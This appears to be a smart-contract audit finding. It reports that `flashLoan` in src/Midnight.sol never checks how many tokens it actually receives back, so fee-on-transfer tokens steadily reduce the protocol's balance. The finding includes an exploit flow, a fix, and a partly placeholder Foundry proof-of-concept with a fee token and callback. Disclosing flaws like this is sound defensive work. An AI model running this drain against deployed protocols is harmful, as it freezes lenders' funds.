### Title
Fee-on-Transfer Token in `flashLoan` Causes Protocol Balance Desync — (File: src/Midnight.sol)

### Summary
The `flashLoan` function in `src/Midnight.sol` (lines 737–752) uses `safeTransferFrom` to collect repayment from the callback, but only validates the boolean return value — it never checks the actual amount received. When a fee-on-transfer token is used, the protocol receives `assets[i] - fee` instead of `assets[i]`, permanently reducing the protocol's token balance after each flash loan. The `EcrecoverRatifier` is entirely irrelevant to this path: `flashLoan` accepts any arbitrary token array and has no market or ratifier gating whatsoever.

### Finding Description

**Code path:**

`src/Midnight.sol:737–752`

```solidity

    if (!success) { assembly { revert(...) } }

```

`safeTransferFrom` only checks that the call did not revert and returned `true`. It does **not** check `balanceOf(address(this))` before and after.

**Root cause:** No received-amount verification after `safeTransferFrom` at line 750.

**Exploit flow:**

Preconditions:
- A fee-on-transfer token `T` (e.g., 1% fee on every transfer) is also the loan token of an active Midnight market.
- Attacker deploys a callback contract `C` that holds `fee` extra tokens of `T`.

Steps:
1. Attacker calls `midnight.flashLoan([T], [N], C, "")`.
2. Line (A): `safeTransfer(T, C, N)` — midnight sends `N`, callback `C` receives `N - fee1`.
3. `onFlashLoan` is called on `C`; it returns `CALLBACK_SUCCESS`.
4. Line (B): `safeTransferFrom(T, C, midnight, N)` — `C` sends `N` (using its `fee1` reserve), midnight receives `N - fee2`. The call returns `true`. `safeTransferFrom` does not revert.
5. `flashLoan` returns successfully.

Net result: midnight's balance of `T` is `B_before - fee2`. The accounting (collateral, withdrawable, claimableSettlementFee) is unchanged. The `tokenBalanceCorrect` invariant (`balance >= collateralSum + withdrawableSum + claimableSettlementFee`) can be violated after enough iterations.

**Why existing checks fail:** `safeTransferFrom` validates only the ERC-20 boolean return, not the received quantity. There is no pre/post balance snapshot in `flashLoan`. The Certora `Solvency.spec` explicitly assumes standard ERC-20 behavior (`// Assume ERC20 tokens transfer correctly: no fee taking...`), so formal verification does not cover this case.

**DoS sub-case:** If `C` does not hold the extra `fee1` tokens, `safeTransferFrom` reverts (insufficient balance). This causes the attacker's own call to revert — it is not a DoS on other users' flash loans.

### Impact Explanation

Each successful flash loan with a fee-on-transfer loan token permanently reduces midnight's balance of that token by `fee2`. Repeated calls drain the protocol's reserves below the sum of outstanding collateral + withdrawable + claimable settlement fee obligations, eventually preventing lenders from withdrawing or collateral from being returned — a concrete accounting desync and potential fund freeze for that token.

### Likelihood Explanation

Preconditions: (1) a fee-on-transfer token must be used as a market loan token; (2) the attacker's callback must hold enough extra tokens to cover the outbound fee. Both are attacker-controlled. `flashLoan` is permissionless — any address can call it with any token array. The attack is repeatable at will, with cost proportional to the fee rate.

### Recommendation

Add a pre/post balance check in `flashLoan` to enforce that the protocol receives at least `assets[i]` tokens back:

```solidity
for (uint256 i = 0; i < tokens.length; i++) {
    uint256 balanceBefore = IERC20(tokens[i]).balanceOf(address(this));
    SafeTransferLib.safeTransferFrom(tokens[i], callback, address(this), assets[i]);
    require(IERC20(tokens[i]).balanceOf(address(this)) >= balanceBefore + assets[i], InsufficientRepayment());
}
```

Alternatively, document that fee-on-transfer tokens are unsupported and add a token allowlist enforced at the `flashLoan` entry point.

import "forge-std/Test.sol";
import {Midnight} from "src/Midnight.sol";
import {IFlashLoanCallback} from "src/interfaces/ICallbacks.sol";
import {CALLBACK_SUCCESS} from "src/libraries/ConstantsLib.sol";

// 1% fee-on-transfer ERC20
contract FeeToken is ERC20 {
    function transfer(address to, uint256 amount) public override returns (bool) {
        uint256 fee = amount / 100;
        super.transfer(to, amount - fee); // recipient gets amount-fee
        _burn(msg.sender, fee);           // fee burned
        return true;
    }
    function transferFrom(address from, address to, uint256 amount) public override returns (bool) {
        uint256 fee = amount / 100;
        super.transferFrom(from, to, amount - fee);
        _burn(from, fee);
        return true;
    }
}

contract FeeFlashCallback is IFlashLoanCallback {
    Midnight midnight;
    FeeToken token;
    constructor(Midnight _m, FeeToken _t) { midnight = _m; token = _t; }
    function onFlashLoan(address, address[] memory, uint256[] memory amounts, bytes memory)
        external returns (bytes32)
    {
        // Top up with fee so safeTransferFrom(assets[i]) can succeed
        token.approve(address(midnight), amounts[0]);
        return CALLBACK_SUCCESS;
    }
}

contract FeeOnTransferFlashLoanTest is Test {
    function testBalanceDesync() public {
        Midnight midnight = new Midnight(...);
        FeeToken token = new FeeToken();
        FeeFlashCallback cb = new FeeFlashCallback(midnight, token);

        uint256 amount = 1000e18;
        deal(address(token), address(midnight), amount);
        // Give callback enough to cover fee
        deal(address(token), address(cb), amount / 100 + 1);

        uint256 balBefore = token.balanceOf(address(midnight));

        address[] memory tokens = new address[](1);
        tokens[0] = address(token);
        uint256[] memory amounts = new uint256[](1);
        amounts[0] = amount;

        midnight.flashLoan(tokens, amounts, address(cb), "");

        uint256 balAfter = token.balanceOf(address(midnight));

        // Assert: protocol balance decreased — accounting desync
        assertLt(balAfter, balBefore, "balance desync: protocol lost tokens");
        // Assert: no revert occurred (safeTransferFrom returned true despite shortfall)
    }
}
